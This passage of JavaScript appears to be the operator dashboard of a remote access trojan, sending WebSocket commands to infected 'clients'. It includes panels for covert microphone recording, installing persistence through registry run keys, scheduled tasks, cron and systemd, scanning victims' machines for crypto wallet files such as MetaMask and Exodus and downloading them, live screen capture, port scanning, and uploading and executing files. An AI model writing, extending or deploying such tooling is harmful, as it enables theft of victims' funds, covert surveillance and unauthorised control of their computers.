    if (!this.selectedConnection) return;
    
    if (confirm(`Close connection ${this.selectedConnection.local_addr}:${this.selectedConnection.local_port} -> ${this.selectedConnection.remote_addr}:${this.selectedConnection.remote_port}?`)) {
        this.ws.send(JSON.stringify({
            type: 'close_connection',
            client_id: this.selectedClient,
            connection_pid: this.selectedConnection.pid,
            local_port: this.selectedConnection.local_port,
            remote_port: this.selectedConnection.remote_port
        }));
        
        document.getElementById('connectionsStatusText').textContent = 'Closing connection...';
    }
}

toggleNetstatMonitor() {
    const btn = document.getElementById('netstatMonitorBtn');
    
    if (this.netstatMonitoring) {
        this.ws.send(JSON.stringify({
            type: 'stop_netstat_monitor',
            client_id: this.selectedClient
        }));
        
        btn.textContent = 'START MONITOR';
        btn.classList.remove('active');
        this.netstatMonitoring = false;
    } else {
        this.ws.send(JSON.stringify({
            type: 'start_netstat_monitor',
            client_id: this.selectedClient
        }));
        
        btn.textContent = 'STOP MONITOR';
        btn.classList.add('active');
        this.netstatMonitoring = true;
    }
}

handleConnectionCloseResult(data) {
    if (data.success) {
        document.getElementById('connectionsStatusText').textContent = 'Connection closed';
        this.refreshConnections();
    } else {
        document.getElementById('connectionsStatusText').textContent = 'Failed to close connection';
    }
}

// Port Scanner Methods
startPortScan() {
    const target = document.getElementById('scanTargetInput').value.trim();
    const startPort = parseInt(document.getElementById('scanStartPort').value) || 1;
    const endPort = parseInt(document.getElementById('scanEndPort').value) || 1000;
    
    if (!target) {
        alert('Please enter a target IP address');
        return;
    }
    
    if (startPort > endPort) {
        alert('Start port must be less than end port');
        return;
    }
    
    this.portScanActive = true;
    this.openPorts = [];
    
    // Update UI
    document.getElementById('startScanBtn').disabled = true;
    document.getElementById('stopScanBtn').disabled = false;
    document.getElementById('scanProgressSection').style.display = 'block';
    document.getElementById('scanTarget').textContent = target;
    document.getElementById('scanProgress').textContent = '0%';
    document.getElementById('scanProgressBar').style.width = '0%';
    document.getElementById('scanResults').innerHTML = '<div class="loading">Scanning...</div>';
    
    // Send scan command
    this.ws.send(JSON.stringify({
        type: 'scan_ports',
        client_id: this.selectedClient,
        scan_target: target,
        start_port: startPort,
        end_port: endPort
    }));
    
    document.getElementById('scannerStatus').textContent = `Scanning ${target}:${startPort}-${endPort}`;
}

stopPortScan() {
    this.ws.send(JSON.stringify({
        type: 'stop_port_scan',
        client_id: this.selectedClient
    }));
    
    this.portScanActive = false;
    document.getElementById('startScanBtn').disabled = false;
    document.getElementById('stopScanBtn').disabled = true;
    document.getElementById('scannerStatus').textContent = 'Scan stopped';
}

setScanPreset(preset) {
    switch(preset) {
        case 'common':
            document.getElementById('scanStartPort').value = '1';
            document.getElementById('scanEndPort').value = '1000';
            break;
        case 'web':
            document.getElementById('scanStartPort').value = '80';
            document.getElementById('scanEndPort').value = '8080';
            break;
        case 'full':
            document.getElementById('scanStartPort').value = '1';
            document.getElementById('scanEndPort').value = '65535';
            break;
    }
}

handlePortScanStarted(data) {
    document.getElementById('scannerStatus').textContent = `Scanning ${data.target} (${data.range})`;
}

handlePortScanProgress(data) {
    document.getElementById('scanProgress').textContent = `${data.progress}%`;
    document.getElementById('scanProgressBar').style.width = `${data.progress}%`;
}

handlePortFound(data) {
    if (data.open) {
        this.openPorts.push({
            port: data.port,
            service: data.service
        });
        
        // Update results immediately
        this.updateScanResults();
    }
}

handlePortScanComplete(data) {
    this.portScanActive = false;
    document.getElementById('startScanBtn').disabled = false;
    document.getElementById('stopScanBtn').disabled = true;
    document.getElementById('scanProgressSection').style.display = 'none';
    
    document.getElementById('scannerStatus').textContent = 
        `Scan complete: ${data.total_open} open ports found out of ${data.total_scanned} scanned`;
    
    if (data.open_ports) {
        this.openPorts = data.open_ports;
        this.updateScanResults();
    }
}

updateScanResults() {
    const resultsContainer = document.getElementById('scanResults');
    
    if (this.openPorts.length === 0) {
        resultsContainer.innerHTML = '<div class="no-results">No open ports found</div>';
        return;
    }
    
    resultsContainer.innerHTML = '';
    
    // Sort by port number
    this.openPorts.sort((a, b) => a.port - b.port);
    
    this.openPorts.forEach(port => {
        const item = document.createElement('div');
        item.className = 'port-item';
        item.innerHTML = `
            <div>
                <span class="port-number">${port.port}</span>
                ${port.service ? `<span class="port-service">${port.service}</span>` : ''}
            </div>
        `;
        resultsContainer.appendChild(item);
    });
}




openAudioRecorder() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for audio recorder', 'error');
        return;
    }
    
    document.getElementById('audioClientId').textContent = this.selectedClient;
    document.getElementById('audioModal').style.display = 'flex';
    
    this.audioRecording = false;
    this.recordingTimer = null;
    this.recordingStartTime = null;
    this.audioRecordings = [];
    this.currentAudioChunks = [];
    
    // Get audio devices
    this.refreshAudioDevices();
    
    this.addTerminalOutput(`>>> Opening audio recorder for ${this.selectedClient}`, 'system');
}

refreshAudioDevices() {
    this.ws.send(JSON.stringify({
        type: 'get_audio_devices',
        client_id: this.selectedClient
    }));
}

handleAudioDevices(data) {
    const deviceSelect = document.getElementById('audioDeviceSelect');
    deviceSelect.innerHTML = '';
    
    if (data.devices && data.devices.length > 0) {
        data.devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.name;
            deviceSelect.appendChild(option);
        });
    } else {
        const option = document.createElement('option');
        option.value = '0';
        option.textContent = 'Default Microphone';
        deviceSelect.appendChild(option);
    }
}

toggleRecording() {
    if (this.audioRecording) {
        this.stopRecording();
    } else {
        this.startRecording();
    }
}

startRecording() {
    const duration = parseInt(document.getElementById('audioDuration').value) || 30;
    const device = parseInt(document.getElementById('audioDeviceSelect').value) || 0;
    
    // Validate duration
    if (duration < 5 || duration > 300) {
        alert('Duration must be between 5 and 300 seconds');
        return;
    }
    
    this.audioRecording = true;
    this.recordingStartTime = Date.now();
    this.currentAudioChunks = [];
    
    // Update UI
    const recordBtn = document.getElementById('recordBtn');
    recordBtn.classList.add('recording');
    document.getElementById('recordBtnText').textContent = 'STOP RECORDING';
    
    document.getElementById('recordVisualizer').classList.add('recording');
    document.getElementById('recordTimer').style.display = 'block';
    
    const statusDot = document.querySelector('.status-dot');
    statusDot.classList.add('recording');
    document.getElementById('recordStatusText').textContent = 'Recording...';
    
    // Send start command
    this.ws.send(JSON.stringify({
        type: 'start_audio_record',
        client_id: this.selectedClient,
        audio_duration: duration,
        audio_device: device
    }));
    
    // Start timer
    this.updateRecordingTimer(duration);
    
    this.updateAudioStatus(`Recording for ${duration} seconds...`);
}

stopRecording() {
    if (!this.audioRecording) return;
    
    this.audioRecording = false;
    
    // Update UI
    const recordBtn = document.getElementById('recordBtn');
    recordBtn.classList.remove('recording');
    document.getElementById('recordBtnText').textContent = 'START RECORDING';
    
    document.getElementById('recordVisualizer').classList.remove('recording');
    document.getElementById('recordTimer').style.display = 'none';
    
    const statusDot = document.querySelector('.status-dot');
    statusDot.classList.remove('recording');
    document.getElementById('recordStatusText').textContent = 'Stopping...';
    
    // Clear timer
    if (this.recordingTimer) {
        clearInterval(this.recordingTimer);
        this.recordingTimer = null;
    }
    
    // Send stop command
    this.ws.send(JSON.stringify({
        type: 'stop_audio_record',
        client_id: this.selectedClient
    }));
    
    this.updateAudioStatus('Stopping recording...');
}

updateRecordingTimer(maxDuration) {
    const startTime = Date.now();
    
    this.recordingTimer = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const minutes = Math.floor(elapsed / 60);
        const seconds = elapsed % 60;
        
        document.getElementById('timerValue').textContent = 
            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        // Update progress bar
        const progress = Math.min((elapsed / maxDuration) * 100, 100);
        document.getElementById('timerBar').style.width = progress + '%';
        
        // Auto stop at max duration
        if (elapsed >= maxDuration) {
            this.stopRecording();
        }
    }, 100);
}

handleAudioRecordStarted(data) {
    this.updateAudioStatus(`Recording started: ${data.filename}`);
    document.getElementById('recordStatusText').textContent = 'Recording...';
}

handleAudioRecordProgress(data) {
    // Update progress if needed
    if (data.progress !== undefined) {
        // Could update UI with progress
    }
}

handleAudioRecordError(data) {
    this.stopRecording();
    this.updateAudioStatus(`Recording error: ${data.error}`);
    alert(`Audio recording error: ${data.error}`);
}

handleAudioFileStart(data) {
    // Initialize download for new audio file
    this.currentAudioFile = {
        filename: data.filename,
        size: data.size,
        chunks: new Array(data.total_chunks),
        totalChunks: data.total_chunks,
        receivedChunks: 0
    };
    
    this.updateAudioStatus(`Receiving audio file: ${data.filename}`);
}

handleAudioFileChunk(data) {
    if (!this.currentAudioFile) return;
    
    // Store chunk
    this.currentAudioFile.chunks[data.chunk_index] = data.chunk_data;
    this.currentAudioFile.receivedChunks++;
    
    // Check if complete
    if (data.is_last || this.currentAudioFile.receivedChunks >= this.currentAudioFile.totalChunks) {
        this.finalizeAudioDownload();
    }
}

handleAudioRecordComplete(data) {
    document.getElementById('recordStatusText').textContent = 'Ready';
    
    if (data.success) {
        this.updateAudioStatus('Recording completed successfully');
    } else {
        this.updateAudioStatus('Recording failed');
    }
}

finalizeAudioDownload() {
    if (!this.currentAudioFile) return;
    
    // Combine chunks
    const fullData = this.currentAudioFile.chunks.join('');
    
    // Decode base64
    try {
        const binaryData = atob(fullData);
        const bytes = new Uint8Array(binaryData.length);
        for (let i = 0; i < binaryData.length; i++) {
            bytes[i] = binaryData.charCodeAt(i);
        }
        
        // Create blob
        const blob = new Blob([bytes], { type: 'audio/wav' });
        const url = URL.createObjectURL(blob);
        
        // Add to recordings list
        const recording = {
            filename: this.currentAudioFile.filename,
            size: this.currentAudioFile.size,
            timestamp: new Date(),
            url: url,
            blob: blob
        };
        
        this.audioRecordings.push(recording);
        this.updateRecordingsList();
        
        this.updateAudioStatus(`Audio saved: ${recording.filename}`);
        
    } catch (error) {
        console.error('Failed to decode audio:', error);
        this.updateAudioStatus('Failed to decode audio file');
    }
    
    this.currentAudioFile = null;
}

updateRecordingsList() {
    const listContainer = document.getElementById('recordingsList');
    
    if (this.audioRecordings.length === 0) {
        listContainer.innerHTML = '<div class="no-recordings">No recordings yet</div>';
        return;
    }
    
    listContainer.innerHTML = '';
    
    // Show recordings in reverse order (newest first)
    [...this.audioRecordings].reverse().forEach((recording, index) => {
        const item = document.createElement('div');
        item.className = 'recording-item';
        
        const sizeKB = Math.round(recording.size / 1024);
        const timeStr = recording.timestamp.toLocaleTimeString();
        
        item.innerHTML = `
            <div class="recording-info">
                <div class="recording-name">${recording.filename}</div>
                <div class="recording-details">${timeStr} • ${sizeKB} KB</div>
            </div>
            <div class="recording-actions">
                <button class="recording-btn" onclick="playAudioRecording(${this.audioRecordings.length - 1 - index})">PLAY</button>
                <button class="recording-btn" onclick="downloadAudioRecording(${this.audioRecordings.length - 1 - index})">DOWNLOAD</button>
            </div>
        `;
        
        listContainer.appendChild(item);
    });
}

playAudioRecording(index) {
    const recording = this.audioRecordings[index];
    if (!recording) return;
    
    // Create audio element and play
    const audio = new Audio(recording.url);
    audio.play().catch(error => {
        console.error('Failed to play audio:', error);
        this.updateAudioStatus('Failed to play audio');
    });
}

downloadAudioRecording(index) {
    const recording = this.audioRecordings[index];
    if (!recording) return;
    
    // Create download link
    const a = document.createElement('a');
    a.href = recording.url;
    a.download = recording.filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

updateAudioStatus(message) {
    document.getElementById('audioStatus').textContent = message;
}



openPersistenceManager() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for persistence manager', 'error');
        return;
    }
    
    document.getElementById('persistenceClientId').textContent = this.selectedClient;
    document.getElementById('persistenceModal').style.display = 'flex';
    
    // Show appropriate methods based on OS
    const client = this.clients.get(this.selectedClient);
    if (client) {
        if (client.os === 'Windows') {
            document.getElementById('windowsMethods').style.display = 'block';
            document.getElementById('linuxMethods').style.display = 'none';
        } else {
            document.getElementById('windowsMethods').style.display = 'none';
            document.getElementById('linuxMethods').style.display = 'block';
        }
    }
    
    // Clear log
    document.getElementById('persistenceLog').innerHTML = '';
    
    // Check current persistence status
    this.checkPersistence();
    
    this.addTerminalOutput(`>>> Opening persistence manager for ${this.selectedClient}`, 'system');
}

checkPersistence() {
    this.ws.send(JSON.stringify({
        type: 'check_persistence',
        client_id: this.selectedClient
    }));
    
    this.addPersistenceLog('Checking persistence status...', 'info');
}

handlePersistenceStatus(data) {
    const indicator = document.getElementById('persistenceIndicator');
    const mainStatus = document.getElementById('persistenceMainStatus');
    const methodsContainer = document.getElementById('installedMethods');
    
    if (data.installed) {
        indicator.className = 'status-indicator active';
        mainStatus.textContent = 'PERSISTENCE ACTIVE';
        
        // Show installed methods
        methodsContainer.innerHTML = '';
        if (data.methods && data.methods.length > 0) {
            data.methods.forEach(method => {
                const tag = document.createElement('div');
                tag.className = 'method-tag';
                tag.textContent = this.formatMethodName(method);
                methodsContainer.appendChild(tag);
            });
        }
        
        this.addPersistenceLog('Persistence is active', 'success');
    } else {
        indicator.className = 'status-indicator inactive';
        mainStatus.textContent = 'NO PERSISTENCE';
        methodsContainer.innerHTML = '<div style="color: #666; font-size: 0.9em;">No persistence methods installed</div>';
        
        this.addPersistenceLog('No persistence detected', 'info');
    }
}

installPersistence(method) {
    if (confirm(`Install persistence using ${this.formatMethodName(method)} method?`)) {
        this.ws.send(JSON.stringify({
            type: 'install_persistence',
            client_id: this.selectedClient,
            persistence_method: method
        }));
        
        this.addPersistenceLog(`Installing persistence: ${method}...`, 'info');
    }
}

removeAllPersistence() {
    if (confirm('Remove all persistence methods? This will make the client non-persistent.')) {
        this.ws.send(JSON.stringify({
            type: 'remove_persistence',
            client_id: this.selectedClient
        }));
        
        this.addPersistenceLog('Removing all persistence methods...', 'info');
    }
}

handlePersistenceResult(data) {
    const operation = data.operation || 'unknown';
    
    if (data.success) {
        if (operation === 'install') {
            this.addPersistenceLog(`Persistence installed successfully: ${data.message || 'Success'}`, 'success');
        } else if (operation === 'remove') {
            this.addPersistenceLog(`Persistence removed: ${data.message || 'Success'}`, 'success');
        }
        
        // Refresh status
        setTimeout(() => this.checkPersistence(), 1000);
    } else {
        this.addPersistenceLog(`Operation failed: ${data.message || 'Unknown error'}`, 'error');
    }
}

formatMethodName(method) {
    const names = {
        'registry': 'Registry Run Key',
        'startup_folder': 'Startup Folder',
        'scheduled_task': 'Scheduled Task',
        'service': 'Windows Service',
        'cron': 'Cron Job',
        'systemd': 'Systemd Service',
        'desktop': 'Desktop Autostart'
    };
    return names[method] || method;
}

addPersistenceLog(message, type = 'info') {
    const logContainer = document.getElementById('persistenceLog');
    const timestamp = new Date().toLocaleTimeString();
    
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    entry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span>${message}`;
    
    logContainer.appendChild(entry);
    logContainer.scrollTop = logContainer.scrollHeight;
}



openWalletScanner() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for wallet scanner', 'error');
        return;
    }
    
    document.getElementById('walletClientId').textContent = this.selectedClient;
    document.getElementById('walletModal').style.display = 'flex';
    
    this.foundWallets = [];
    this.downloadedWallets = new Set();
    this.currentWalletFilter = 'all';
    this.walletDownloadQueue = [];
    this.isDownloadingWallet = false;
    
    // Reset stats
    document.getElementById('walletsFound').textContent = '0';
    document.getElementById('walletsDownloaded').textContent = '0';
    document.getElementById('scanStatus').textContent = 'Ready';
    document.getElementById('walletResults').innerHTML = '<div class="no-results">No scan performed yet</div>';
    
    this.addTerminalOutput(`>>> Opening wallet scanner for ${this.selectedClient}`, 'system');
}

startWalletScan() {
    const scanBtn = document.getElementById('scanWalletsBtn');
    scanBtn.disabled = true;
    scanBtn.classList.add('scanning');
    scanBtn.textContent = '◤ SCANNING... ◥';
    
    this.foundWallets = [];
    this.downloadedWallets.clear();
    document.getElementById('walletsFound').textContent = '0';
    document.getElementById('walletsDownloaded').textContent = '0';
    document.getElementById('scanStatus').textContent = 'Scanning...';
    document.getElementById('walletResults').innerHTML = '<div class="loading">Scanning for crypto wallets...</div>';
    
    this.ws.send(JSON.stringify({
        type: 'scan_wallets',
        client_id: this.selectedClient
    }));
}

handleWalletScanStarted() {
    document.getElementById('scanStatus').textContent = 'Scanning...';
    this.addTerminalOutput('>>> Wallet scan started', 'system');
}

handleWalletFound(data) {
    const wallet = {
        type: data.wallet_type,
        path: data.path,
        size: data.size,
        category: data.category,
        downloaded: false
    };
    
    this.foundWallets.push(wallet);
    document.getElementById('walletsFound').textContent = data.total_found || this.foundWallets.length;
    
    // Update results in real-time
    this.updateWalletResults();
}

handleWalletScanComplete(data) {
    const scanBtn = document.getElementById('scanWalletsBtn');
    scanBtn.disabled = false;
    scanBtn.classList.remove('scanning');
    scanBtn.textContent = '◤ START SCAN ◥';
    
    document.getElementById('scanStatus').textContent = 'Scan Complete';
    document.getElementById('walletsFound').textContent = data.total_found || this.foundWallets.length;
    
    if (data.wallets) {
        // Update with complete list if provided
        this.foundWallets = data.wallets.map(path => {
            // Find existing wallet data or create new
            const existing = this.foundWallets.find(w => w.path === path);
            return existing || {
                type: this.extractWalletType(path),
                path: path,
                size: 0,
                category: this.detectWalletCategory(path),
                downloaded: false
            };
        });
    }
    
    this.updateWalletResults();
    this.addTerminalOutput(`>>> Wallet scan complete: ${this.foundWallets.length} wallets found`, 'success');
}

extractWalletType(path) {
    // Extract wallet type from path
    const pathLower = path.toLowerCase();
    
    if (pathLower.includes('metamask')) return 'MetaMask';
    if (pathLower.includes('bitcoin')) return 'Bitcoin Core';
    if (pathLower.includes('ethereum')) return 'Ethereum';
    if (pathLower.includes('electrum')) return 'Electrum';
    if (pathLower.includes('exodus')) return 'Exodus';
    if (pathLower.includes('atomic')) return 'Atomic';
    if (pathLower.includes('binance')) return 'Binance';
    if (pathLower.includes('coinbase')) return 'Coinbase';
    if (pathLower.includes('phantom')) return 'Phantom';
    if (pathLower.includes('trust')) return 'Trust Wallet';
    if (pathLower.includes('ronin')) return 'Ronin';
    if (pathLower.includes('yoroi')) return 'Yoroi';
    if (pathLower.includes('nami')) return 'Nami';
    if (pathLower.includes('jaxx')) return 'Jaxx';
    if (pathLower.includes('coinomi')) return 'Coinomi';
    if (pathLower.includes('guarda')) return 'Guarda';
    
    // Check by filename
    if (pathLower.includes('wallet.dat')) return 'Bitcoin Core';
    if (pathLower.includes('.wallet')) return 'Wallet File';
    if (pathLower.includes('keystore')) return 'Ethereum Keystore';
    
    return 'Unknown Wallet';
}

detectWalletCategory(path) {
    const pathLower = path.toLowerCase();
    
    if (pathLower.includes('local extension settings') || 
        pathLower.includes('indexeddb') || 
        pathLower.includes('chrome') || 
        pathLower.includes('brave') || 
        pathLower.includes('edge') || 
        pathLower.includes('firefox')) {
        return 'extension';
    }
    
    if (pathLower.includes('localstorage')) {
        return 'localstorage';
    }
    
    return 'desktop';
}

filterWallets(filter) {
    this.currentWalletFilter = filter;
    
    // Update filter buttons
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    
    this.updateWalletResults();
}

updateWalletResults() {
    const resultsContainer = document.getElementById('walletResults');
    
    if (this.foundWallets.length === 0) {
        resultsContainer.innerHTML = '<div class="no-results">No wallets found</div>';
        return;
    }
    
    // Filter wallets
    let filteredWallets = this.foundWallets;
    if (this.currentWalletFilter !== 'all') {
        if (this.currentWalletFilter === 'downloaded') {
            filteredWallets = this.foundWallets.filter(w => this.downloadedWallets.has(w.path));
        } else {
            filteredWallets = this.foundWallets.filter(w => w.category === this.currentWalletFilter);
        }
    }
    
    resultsContainer.innerHTML = '';
    
    filteredWallets.forEach((wallet, index) => {
        const item = document.createElement('div');
        item.className = 'wallet-item';
        if (this.downloadedWallets.has(wallet.path)) {
            item.classList.add('downloaded');
        }
        
        const sizeText = wallet.size > 0 ? this.formatFileSize(wallet.size) : 'Unknown size';
        const isDownloaded = this.downloadedWallets.has(wallet.path);
        
        item.innerHTML = `
            <div class="wallet-details">
                <div class="wallet-type">${wallet.type}</div>
                <div class="wallet-path">${wallet.path}</div>
                <div class="wallet-meta">
                    <span class="wallet-size">${sizeText}</span>
                    <span class="wallet-category-tag">${wallet.category}</span>
                </div>
            </div>
            <div class="wallet-actions">
                <button class="wallet-action-btn ${isDownloaded ? 'downloaded' : ''}" 
                        onclick="downloadWallet(${index})" 
                        ${isDownloaded ? 'disabled' : ''}>
                    ${isDownloaded ? 'DOWNLOADED' : 'DOWNLOAD'}
                </button>
            </div>
        `;
        
        resultsContainer.appendChild(item);
    });
    
    if (filteredWallets.length === 0) {
        resultsContainer.innerHTML = '<div class="no-results">No wallets match the selected filter</div>';
    }
}

downloadWallet(index) {
    const wallet = this.foundWallets[index];
    if (!wallet || this.downloadedWallets.has(wallet.path)) return;
    
    // Add to download queue
    this.walletDownloadQueue.push(wallet);
    
    // Start download if not already downloading
    if (!this.isDownloadingWallet) {
        this.processWalletDownloadQueue();
    }
}

processWalletDownloadQueue() {
    if (this.walletDownloadQueue.length === 0) {
        this.isDownloadingWallet = false;
        return;
    }
    
    this.isDownloadingWallet = true;
    const wallet = this.walletDownloadQueue.shift();
    
    // Show download progress
    document.getElementById('walletDownloadProgress').style.display = 'block';
    document.getElementById('downloadingWallet').textContent = wallet.type;
    document.getElementById('downloadProgress').textContent = '0%';
    document.getElementById('walletProgressBar').style.width = '0%';
    
    // Initialize download
    this.currentWalletDownload = {
        wallet: wallet,
        chunks: new Map(),
        totalChunks: 0
    };
    
    // Send download request
    this.ws.send(JSON.stringify({
        type: 'download_wallet',
        client_id: this.selectedClient,
        wallet_path: wallet.path
    }));
}

handleWalletDownloadStart(data) {
    if (!this.currentWalletDownload) return;
    
    this.currentWalletDownload.filename = data.filename;
    this.currentWalletDownload.size = data.size;
    this.currentWalletDownload.totalChunks = data.total_chunks;
    
    this.addTerminalOutput(`>>> Downloading wallet: ${data.filename}`, 'system');
}

handleWalletDownloadChunk(data) {
    if (!this.currentWalletDownload) return;
    
    // Store chunk
    this.currentWalletDownload.chunks.set(data.chunk_index, data.chunk_data);
    
    // Update progress
    const progress = Math.round(((data.chunk_index + 1) / data.total_chunks) * 100);
    document.getElementById('downloadProgress').textContent = `${progress}%`;
    document.getElementById('walletProgressBar').style.width = `${progress}%`;
    
    // Check if complete
    if (data.is_last || this.currentWalletDownload.chunks.size >= this.currentWalletDownload.totalChunks) {
        this.finalizeWalletDownload();
    }
}

handleWalletDownloadComplete(data) {
    if (data.success) {
        // Already handled in finalizeWalletDownload
    } else {
        this.addTerminalOutput(`>>> Wallet download failed: ${data.error}`, 'error');
        document.getElementById('walletDownloadProgress').style.display = 'none';
    }
    
    // Process next in queue
    this.processWalletDownloadQueue();
}

finalizeWalletDownload() {
    if (!this.currentWalletDownload) return;
    
    // Combine chunks
    let fullData = '';
    for (let i = 0; i < this.currentWalletDownload.totalChunks; i++) {
        if (this.currentWalletDownload.chunks.has(i)) {
            fullData += this.currentWalletDownload.chunks.get(i);
        }
    }
    
    // Decode and download
    try {
        const binaryData = atob(fullData);
        const bytes = new Uint8Array(binaryData.length);
        for (let i = 0; i < binaryData.length; i++) {
            bytes[i] = binaryData.charCodeAt(i);
        }
        
        const blob = new Blob([bytes]);
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = this.currentWalletDownload.filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        // Mark as downloaded
        this.downloadedWallets.add(this.currentWalletDownload.wallet.path);
        document.getElementById('walletsDownloaded').textContent = this.downloadedWallets.size;
        
        // Update UI
        this.updateWalletResults();
        
        this.addTerminalOutput(`>>> Wallet downloaded: ${this.currentWalletDownload.filename}`, 'success');
        
    } catch (error) {
        console.error('Failed to download wallet:', error);
        this.addTerminalOutput('>>> Failed to process wallet download', 'error');
    }
    
    // Hide progress
    document.getElementById('walletDownloadProgress').style.display = 'none';
    
    // Clear current download
    this.currentWalletDownload = null;
    
    // Process next in queue
    setTimeout(() => this.processWalletDownloadQueue(), 500);
}




            openRemoteDesktop() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for remote desktop', 'error');
                    return;
                }
                
                document.getElementById('rdpClientId').textContent = this.selectedClient;
                document.getElementById('rdpModal').style.display = 'flex';
                
                // Reset RDP state
                this.stopRemoteDesktop();
                
                this.addTerminalOutput(`>>> Opening remote desktop for ${this.selectedClient}`, 'system');
            }
            
            startRemoteDesktop() {
                if (!this.selectedClient || this.rdpActive) return;
                
                const quality = document.getElementById('rdpQuality').value;
                
                // Update UI
                document.getElementById('rdpStartBtn').disabled = true;
                document.getElementById('rdpStopBtn').disabled = false;
                document.getElementById('rdpStatus').textContent = 'CONNECTING...';
                document.getElementById('rdpStatus').className = 'rdp-status connecting';
                
                // Send start command to client with quality
                const message = {
                    type: 'start_screenshot',
                    client_id: this.selectedClient,
                    quality: quality
                };
                
                this.ws.send(JSON.stringify(message));
                this.rdpActive = true;
                
                // Start requesting screenshots with improved timing
                this.rdpInterval = setInterval(() => {
                    if (this.rdpActive && this.selectedClient) {
                        const message = {
                            type: 'get_screenshot',
                            client_id: this.selectedClient
                        };
                        this.ws.send(JSON.stringify(message));
                    }
                }, 500); // 2 FPS initially
                
                this.addTerminalOutput(`>>> Starting remote desktop for ${this.selectedClient}`, 'system');
            }
            
            stopRemoteDesktop() {
                if (this.rdpInterval) {
                    clearInterval(this.rdpInterval);
                    this.rdpInterval = null;
                }
                
                this.rdpActive = false;
                
                // Update UI
                document.getElementById('rdpStartBtn').disabled = false;
                document.getElementById('rdpStopBtn').disabled = true;
                document.getElementById('rdpStatus').textContent = 'DISCONNECTED';
                document.getElementById('rdpStatus').className = 'rdp-status disconnected';
                document.getElementById('screenImage').style.display = 'none';
                document.getElementById('screenPlaceholder').style.display = 'block';
                document.getElementById('fpsCounter').style.display = 'none';
                
                // Send stop command to client
                if (this.selectedClient) {
                    const message = {
                        type: 'stop_screenshot',
                        client_id: this.selectedClient
                    };
                    this.ws.send(JSON.stringify(message));
                }
            }
            
            updateScreenshot(data) {
                if (!this.rdpActive) return;
                
                const screenImage = document.getElementById('screenImage');
                const screenPlaceholder = document.getElementById('screenPlaceholder');
                const fpsCounter = document.getElementById('fpsCounter');
                const rdpStatus = document.getElementById('rdpStatus');
                
                if (data.success && data.data) {
                    try {
                        // Validate base64 data before creating image
                        const base64Data = data.data;
                        if (base64Data && base64Data.length > 0) {
                            // Test if it's valid base64
                            atob(base64Data.substring(0, Math.min(100, base64Data.length)));
                            
                            // Update image
                            screenImage.src = 'data:image/bmp;base64,' + base64Data;
                            screenImage.style.display = 'block';
                            screenPlaceholder.style.display = 'none';
                            fpsCounter.style.display = 'block';
                            
                            // Update status
                            rdpStatus.textContent = 'CONNECTED';
                            rdpStatus.className = 'rdp-status connected';
                            
                            // Update FPS counter
                            this.fpsCounter++;
                            const now = Date.now();
                            if (now - this.lastFpsUpdate >= 1000) {
                                fpsCounter.textContent = `FPS: ${this.fpsCounter}`;
                                this.fpsCounter = 0;
                                this.lastFpsUpdate = now;
                            }
                            
                            console.log(`[SCREENSHOT] Received valid screenshot: ${base64Data.length} chars`);
                            
                            // Adjust refresh rate based on quality
                            const quality = document.getElementById('rdpQuality').value;
                            let interval = 500; // Default 2 FPS
                            switch (quality) {
                                case 'low': interval = 400; break;   // 2.5 FPS
                                case 'medium': interval = 300; break; // 3.3 FPS
                                case 'high': interval = 200; break;   // 5 FPS
                            }
                            
                            if (this.rdpInterval) {
                                clearInterval(this.rdpInterval);
                                this.rdpInterval = setInterval(() => {
                                    if (this.rdpActive && this.selectedClient) {
                                        const message = {
                                            type: 'get_screenshot',
                                            client_id: this.selectedClient
                                        };
                                        this.ws.send(JSON.stringify(message));
                                    }
                                }, interval);
                            }
                        } else {
                            throw new Error('Empty screenshot data');
                        }
                    } catch (error) {
                        console.error('[SCREENSHOT] Invalid screenshot data:', error);
                        rdpStatus.textContent = 'DATA ERROR';
                        rdpStatus.className = 'rdp-status disconnected';
                    }
                } else {
                    // Error getting screenshot
                    console.log('[SCREENSHOT] Screenshot failed or no data');
                    rdpStatus.textContent = 'ERROR';
                    rdpStatus.className = 'rdp-status disconnected';
                }
            }
            
            openRemoteExecute() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for remote execute', 'error');
                    return;
                }
                
                document.getElementById('execClientId').textContent = this.selectedClient;
                document.getElementById('execModal').style.display = 'flex';
                
                // Reset state
                this.resetExecModal();
                
                this.addTerminalOutput(`>>> Opening remote execute for ${this.selectedClient}`, 'system');
            }
            
            resetExecModal() {
                this.selectedFile = null;
                this.uploadedFileName = null;
                document.getElementById('fileInput').value = '';
                document.getElementById('fileInfo').textContent = 'No file selected (Max: 50MB)';
                document.getElementById('progressSection').style.display = 'none';
                document.getElementById('progressBar').style.width = '0%';
                document.getElementById('progressText').textContent = '0%';
                document.getElementById('uploadBtn').disabled = true;
                document.getElementById('executeBtn').disabled = true;
                document.getElementById('execOutput').innerHTML = `◤ EXECUTION OUTPUT ◥\n────────────────────\nReady to upload and execute files...`;
            }
            
            handleFileSelect(event) {
                const file = event.target.files[0];
                if (!file) return;
                
                const maxSize = 50 * 1024 * 1024; // 50MB
                
                if (file.size > maxSize) {
                    this.addExecOutput(`ERROR: File too large (${(file.size / 1024 / 1024).toFixed(2)}MB). Max size is 50MB.`, 'error');
                    event.target.value = '';
                    return;
                }
                
                this.selectedFile = file;
                document.getElementById('fileInfo').textContent = `Selected: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)}MB)`;
                document.getElementById('uploadBtn').disabled = false;
                this.addExecOutput(`File selected: ${file.name}`);
            }
            
            async uploadFile() {
                if (!this.selectedFile || !this.selectedClient) return;
                
                const uploadBtn = document.getElementById('uploadBtn');
                const executeBtn = document.getElementById('executeBtn');
